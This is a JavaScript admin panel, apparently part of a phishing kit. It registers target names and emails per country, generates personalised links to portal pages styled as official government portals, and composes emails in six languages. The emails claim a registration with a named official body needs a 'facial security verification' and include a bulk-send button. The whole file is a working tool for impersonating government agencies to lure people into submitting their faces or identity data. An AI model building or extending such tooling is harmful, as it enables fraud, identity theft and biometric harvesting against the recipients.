/* ============================================================
   panel.js — Painel Mãe
   Abas por governo, cadastro de clientes, geração de link,
   cópia do link e e-mail profissional (mailto + pré-visualização).
   ============================================================ */
(function () {
  'use strict';
  var PAISES = window.PAISES || {};
  var Store = window.PV.Store;
  var SET = 'pv_settings_v1';

  function settings() {
    try { return JSON.parse(localStorage.getItem(SET)) || {}; } catch (e) { return {}; }
  }
  function saveSettings(p) { localStorage.setItem(SET, JSON.stringify(p)); }

  var current = new URLSearchParams(location.search).get('gov') || 'pt';
  if (!PAISES[current]) current = 'pt';

  var tabsEl = document.getElementById('tabs');
  var mainEl = document.getElementById('main');

  function basePortalURL(code, nome, verificar) {
    var u = new URL(code + '/index.html', location.href);
    if (nome) u.searchParams.set('nome', nome);
    if (verificar) u.searchParams.set('verificar', '1');
    return u.href;
  }

  function esc(s) { return window.PV.esc(s); }

  function renderTabs() {
    var html = Object.keys(PAISES).map(function (code) {
      var p = PAISES[code];
      return '<button class="tab' + (code === current ? ' is-active' : '') + '" data-gov="' + code + '">' +
        '<span class="flag">' + p.bandeira + '</span>' + esc(p.nome) +
        '<span style="opacity:.6;font-weight:500">(' + Store.list(code).length + ')</span></button>';
    }).join('');
    tabsEl.innerHTML = html;
    Array.prototype.forEach.call(tabsEl.querySelectorAll('.tab'), function (b) {
      b.addEventListener('click', function () {
        current = b.getAttribute('data-gov');
        history.replaceState(null, '', '?gov=' + current);
        renderTabs(); renderMain();
      });
    });
  }

  function renderMain() {
    var p = PAISES[current];
    var list = Store.list(current);
    var st = settings();

    mainEl.innerHTML =
      '<div class="p-head">' +
        '<img src="' + p.logo + '" alt="" onerror="this.style.display=\'none\'">' +
        '<div><h2>' + p.bandeira + ' ' + esc(p.nome) + ' — ' + esc(p.portal) + '</h2>' +
        '<div class="sub">' + esc(p.oficial) + ' · <a href="' + current + '/index.html" target="_blank">abrir portal ↗</a></div></div>' +
        '<div class="grow"></div>' +
        '<button class="btn btn-ghost sm" id="open-all">Abrir e-mail para todos</button>' +
      '</div>' +

      '<div class="p-cols">' +
        '<div class="panel"><div class="ph">Cadastrar cliente</div><div class="pb">' +
          '<label class="field" for="c-nome">Nome completo do cliente</label>' +
          '<input id="c-nome" class="input" placeholder="' + esc(p.t.nomeLocal) + '">' +
          '<label class="field" for="c-mail" style="margin-top:12px">E-mail do cliente (opcional)</label>' +
          '<input id="c-mail" class="input" type="email" placeholder="cliente@gmail.com">' +
          '<p class="hint">Só quem estiver cadastrado aqui será reconhecido na verificação.</p>' +
          '<div style="margin-top:14px"><button class="btn btn-primary" id="c-add">Cadastrar e gerar link</button></div>' +
          '<hr style="border:0;border-top:1px solid var(--line-2);margin:18px 0">' +
          '<label class="field" for="s-from">Seu e-mail (remetente)</label>' +
          '<input id="s-from" class="input" type="email" placeholder="voce@gmail.com" value="' + esc(st.from || '') + '">' +
          '<div style="margin-top:10px"><button class="btn btn-ghost" id="s-save">Salvar meu e-mail</button></div>' +
        '</div></div>' +

        '<div>' +
          '<div class="kpi" style="margin-bottom:18px">' +
            '<div class="k"><b>' + list.length + '</b><span>Clientes em ' + esc(p.nome) + '</span></div>' +
            '<div class="k"><b>' + Object.keys(PAISES).reduce(function (a, c) { return a + Store.list(c).length; }, 0) + '</b><span>Total de clientes</span></div>' +
          '</div>' +
          '<div class="panel"><div class="ph">Clientes cadastrados <span class="grow"></span>' +
            '<a class="mini" href="admin.html">gerenciar →</a></div>' +
            '<div class="pb" id="list"></div>' +
          '</div>' +
        '</div>' +
      '</div>' +

      '<div class="panel" style="margin-top:22px"><div class="ph">Pré-visualização do e-mail</div>' +
        '<div class="pb"><div class="email-preview" id="ep"></div></div>' +
      '</div>';

    document.getElementById('c-add').addEventListener('click', addClient);
    document.getElementById('s-save').addEventListener('click', function () {
      var s = settings(); s.from = document.getElementById('s-from').value.trim(); saveSettings(s);
      window.PV.toast('E-mail do remetente salvo.');
    });
    document.getElementById('open-all').addEventListener('click', function () {
      if (!list.length) { window.PV.toast('Cadastre ao menos um cliente.'); return; }
      list.forEach(function (c, i) { setTimeout(function () { openMail(p, c); }, i * 400); });
    });

    renderList(p, list);
    renderPreview(p, list[0]);
  }

  function renderList(p, list) {
    var box = document.getElementById('list');
    if (!list.length) { box.innerHTML = '<div class="empty">Nenhum cliente cadastrado para ' + esc(p.nome) + '.<br>Use o formulário ao lado.</div>'; return; }
    var html = '<table><thead><tr><th>Cliente</th><th>Link</th><th style="width:230px">Ações</th></tr></thead><tbody>';
    list.forEach(function (c) {
      var url = basePortalURL(p.code, c.nome, true);
      html += '<tr>' +
        '<td><div class="rowname">' + esc(c.nome) + '</div><div class="rowmail">' + (c.email ? esc(c.email) : 'sem e-mail') + '</div></td>' +
        '<td><div class="linkbox"><code>' + esc(url.replace(/^https?:\/\//, '')) + '</code></div></td>' +
        '<td>' +
          '<button class="mini" data-copy="' + esc(url) + '">copiar</button>' +
          '<button class="mini" data-mail="' + c.id + '">e-mail</button>' +
          '<button class="mini" data-open="' + esc(url) + '">abrir</button>' +
          '<button class="mini red" data-del="' + c.id + '">excluir</button>' +
        '</td></tr>';
    });
    box.innerHTML = html + '</tbody></table>';

    box.querySelectorAll('[data-copy]').forEach(function (b) {
      b.addEventListener('click', function () { copy(b.getAttribute('data-copy')); });
    });
    box.querySelectorAll('[data-open]').forEach(function (b) {
      b.addEventListener('click', function () { window.open(b.getAttribute('data-open'), '_blank'); });
    });
    box.querySelectorAll('[data-mail]').forEach(function (b) {
      b.addEventListener('click', function () { var c = byId(list, b.getAttribute('data-mail')); if (c) openMail(p, c); });
    });
    box.querySelectorAll('[data-del]').forEach(function (b) {
      b.addEventListener('click', function () {
        if (confirm('Excluir este cliente?')) { Store.remove(p.code, b.getAttribute('data-del')); renderTabs(); renderMain(); }
      });
    });
  }

  function byId(list, id) { for (var i = 0; i < list.length; i++) if (list[i].id === id) return list[i]; return null; }

  function addClient() {
    var p = PAISES[current];
    var nome = document.getElementById('c-nome').value.trim();
    var mail = document.getElementById('c-mail').value.trim();
    if (nome.length < 3) { window.PV.toast('Informe o nome completo.'); return; }
    if (Store.findByName(p.code, nome)) { window.PV.toast('Este nome já está cadastrado.'); }
    var item = Store.add(p.code, nome, mail, window.PV.makeRef(p.code));
    document.getElementById('c-nome').value = '';
    document.getElementById('c-mail').value = '';
    renderTabs(); renderMain();
    var url = basePortalURL(p.code, item.nome, true);
    copy(url, 'Cliente cadastrado. Link copiado!');
  }

  function copy(txt, msg) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(txt).then(function () { window.PV.toast(msg || 'Link copiado!'); }, fallback);
    } else fallback();
    function fallback() {
      var t = document.createElement('textarea'); t.value = txt; document.body.appendChild(t); t.select();
      try { document.execCommand('copy'); } catch (e) {} t.remove(); window.PV.toast(msg || 'Link copiado!');
    }
  }

  /* --------------------------------------------------------
     E-mail profissional
     -------------------------------------------------------- */
  function emailData(p, c) {
    var url = basePortalURL(p.code, c.nome, true);
    var st = settings();
    var from = st.from || '';
    var first = c.nome.split(' ')[0];
    var subject, body, heropt;
    if (p.code === 'pt') {
      subject = 'Verificação de processo em andamento — ' + p.portal;
      heropt = 'Verificação em andamento';
      body = 'Olá, ' + first + '!';
      var p1 = 'Seu processo de cadastramento junto a <strong>' + p.oficial + '</strong> está em andamento e precisa de uma etapa de confirmação.';
      var p2 = 'Para concluir, clique no botão abaixo e faça a verificação facial de segurança. Leva menos de um minuto.';
      var cta = 'Fazer minha verificação';
      var sig = 'Equipe ' + p.portal;
      var foot = 'Este e-mail foi enviado automaticamente. Não é necessário responder.';
    } else if (p.code === 'es') {
      subject = 'Verificación de trámite en curso — ' + p.portal;
      heropt = 'Verificación en curso';
      body = 'Hola, ' + first + '!';
      var p1 = 'Su trámite de registro ante <strong>' + p.oficial + '</strong> está en curso y requiere un paso de confirmación.';
      var p2 = 'Para finalizar, pulse el botón de abajo y realice la verificación facial de seguridad. Tarda menos de un minuto.';
      var cta = 'Realizar mi verificación';
      var sig = 'Equipo ' + p.portal;
      var foot = 'Este correo se envió automáticamente. No es necesario responder.';
    } else if (p.code === 'fr') {
      subject = 'Vérification de démarche en cours — ' + p.portal;
      heropt = 'Vérification en cours';
      body = 'Bonjour ' + first + ',';
      var p1 = 'Votre démarche d’enregistrement auprès de <strong>' + p.oficial + '</strong> est en cours et nécessite une étape de confirmation.';
      var p2 = 'Pour finaliser, cliquez sur le bouton ci-dessous et effectuez la vérification faciale de sécurité. Cela prend moins d’une minute.';
      var cta = 'Faire ma vérification';
      var sig = 'L’équipe ' + p.portal;
      var foot = 'Cet e-mail a été envoyé automatiquement. Pas besoin d’y répondre.';
    } else if (p.code === 'de') {
      subject = 'Laufende Verfahrensprüfung — ' + p.portal;
      heropt = 'Prüfung läuft';
      body = 'Hallo ' + first + ',';
      var p1 = 'Ihr Registrierungsverfahren bei <strong>' + p.oficial + '</strong> läuft und erfordert einen Bestätigungsschritt.';
      var p2 = 'Klicken Sie zum Abschluss auf die Schaltfläche unten und führen Sie die Sicherheits-Gesichtsprüfung durch. Sie dauert unter einer Minute.';
      var cta = 'Meine Prüfung durchführen';
      var sig = 'Team ' + p.portal;
      var foot = 'Diese E-Mail wurde automatisch gesendet. Eine Antwort ist nicht nötig.';
    } else if (p.code === 'it') {
      subject = 'Verifica del procedimento in corso — ' + p.portal;
      heropt = 'Verifica in corso';
      body = 'Ciao ' + first + ',';
      var p1 = 'Il tuo procedimento di registrazione presso <strong>' + p.oficial + '</strong> è in corso e richiede un passaggio di conferma.';
      var p2 = 'Per completare, clicca il pulsante qui sotto ed esegui la verifica del volto per la sicurezza. Richiede meno di un minuto.';
      var cta = 'Esegui la mia verifica';
      var sig = 'Team ' + p.portal;
      var foot = 'Questa e-mail è stata inviata automaticamente. Non serve rispondere.';
    } else {
      subject = 'Process verification in progress — ' + p.portal;
      heropt = 'Verification in progress';
      body = 'Hello ' + first + ',';
      var p1 = 'Your registration process with <strong>' + p.oficial + '</strong> is in progress and needs a confirmation step.';
      var p2 = 'To finish, click the button below and complete the facial security check. It takes less than a minute.';
      var cta = 'Do my verification';
      var sig = 'The ' + p.portal + ' team';
      var foot = 'This email was sent automatically. No reply needed.';
    }
    return { subject: subject, heropt: heropt, body: body, p1: p1, p2: p2, cta: cta, sig: sig, foot: foot, url: url, from: from };
  }

  function renderPreview(p, c) {
    var ep = document.getElementById('ep');
    if (!c) { ep.innerHTML = '<div class="empty">Cadastre um cliente para ver o e-mail.</div>'; return; }
    var d = emailData(p, c);
    ep.outerHTML = '<div class="email-preview" id="ep"><div class="ep-b"><div class="ep-card">' +
      '<div class="ep-head"><img src="' + p.logo + '" alt="" onerror="this.style.display=\'none\'">' +
        '<div><strong style="display:block">' + esc(p.portal) + '</strong><span style="font-size:12px;opacity:.85">' + esc(p.oficial) + '</span></div></div>' +
      '<div class="ep-body">' +
        '<div style="font-size:12px;letter-spacing:.08em;text-transform:uppercase;color:#6b7176;font-weight:700">' + esc(d.heropt) + '</div>' +
        '<p>' + esc(d.body) + '</p><p>' + d.p1 + '</p><p>' + d.p2 + '</p>' +
        '<a class="ep-btn" href="' + d.url + '" target="_blank">' + esc(d.cta) + ' →</a>' +
        '<p style="font-size:12.5px;color:#6b7176">' + esc(d.url) + '</p>' +
        '<p>' + esc(d.sig) + '</p>' +
        '<hr style="border:0;border-top:1px solid #eceef1"><p style="font-size:12px;color:#6b7176">' + esc(d.foot) + '</p>' +
      '</div></div></div></div>';
  }

  function openMail(p, c) {
    var d = emailData(p, c);
    var bodyText = [
      d.body, '',
      d.p1.replace(/<[^>]+>/g, ''), '',
      d.p2.replace(/<[^>]+>/g, ''), '',
      d.cta + ': ' + d.url, '',
      d.sig, '', d.foot
    ].join('\r\n');
    var to = c.email || '';
    var href = 'mailto:' + encodeURIComponent(to) +
      '?subject=' + encodeURIComponent(d.subject) +
      (d.from ? '&cc=' + encodeURIComponent(d.from) : '') +
      '&body=' + encodeURIComponent(bodyText);
    window.location.href = href;
    renderPreview(p, c);
    window.PV.toast('Abrindo seu e-mail com a mensagem pronta.');
  }

  renderTabs();
  renderMain();
})();
